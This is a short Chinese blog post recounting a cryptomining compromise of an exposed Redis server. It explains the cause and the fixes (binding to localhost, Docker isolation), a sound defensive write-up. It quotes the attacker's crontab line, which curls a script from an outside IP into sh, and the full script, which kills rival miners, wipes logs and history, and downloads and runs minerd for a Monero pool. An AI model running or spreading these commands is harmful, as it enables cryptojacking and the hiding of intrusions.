# coder| redis 漏洞导致被挖矿

## 事件回顾

用 [Redis Desktop Manager](https://redisdesktop.com/) 连接我在 aliyun 上的机器，突然发现多了一个键：

```
get agjriuqpxa
*/1 * * * * /usr/bin/curl -fsSL http://98.142.140.13:8220/test11.sh | sh
```

访问 http://98.142.140.13:8220/test11.sh：

```
#!/bin/bash
(ps auxf|grep -v grep|grep stratum |awk '{print $2}'|xargs kill -9;crontab -r;pkill -9 minerd;pkill -9 i586;pkill -9 gddr;pkill -9 yam;echo > /var/log/wtmp;history -c;cd ~;curl -L http://98.142.140.13:8220/minerd -o minerd;chmod +x minerd;setsid /root/minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo -p x &>>/dev/null)
```

分析可知：

- 通过配置 crontab，下载 sh 脚本
- sh 脚本中下载挖矿文件 `minerd`，然后运行

## 事件分析

redis 漏洞，可以回写数据到本地文件，这样就可以做很多事了：比如上面这样，新增一个 crontab 来挖矿

## how

这已经是第三次经历挖矿了，第一次和第二次都是公司的 aliyun 测试机，大家发现 cpu 跑满，top 后发现了挖矿脚本。第一次清理了 crontab（包括用户的和系统的），知道第二次再次出现，才定位到是redis的漏洞。

处理办法：

- 公司是修改 `redis.conf`，添加 `bind 127.0.0.1`
- 我 aliyun 上使用 docker 来部署的环境，所以上面 crontab 中的命令根本 **跑不起来**

## 写在最后

- https://blog.csdn.net/hu_wen/article/details/51908597